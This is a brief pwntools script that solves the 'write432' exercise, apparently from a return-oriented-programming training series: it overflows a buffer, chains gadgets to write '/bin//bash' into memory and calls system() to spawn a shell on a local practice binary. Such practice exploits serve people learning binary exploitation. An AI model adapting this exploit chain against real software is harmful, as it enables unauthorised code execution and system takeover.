from pwn import *
e = ELF('write432',checksec=False)

STRING = "/bin//bash\x00\x00"
popedi = p32(0x080486da)
addr = 0x804a040
mov = p32(0x8048670)
system = p32(0x08048430)
payload = cyclic(44)
payload += popedi + p32(addr) + STRING[0:4]+ mov
payload += popedi + p32(addr+4) + STRING[4:8]+ mov
payload += popedi + p32(addr+8) + STRING[8:12]+ mov
payload += system + popedi + p32(addr) 

r = process(e.path)
r.sendlineafter("> ",payload)

r.interactive()
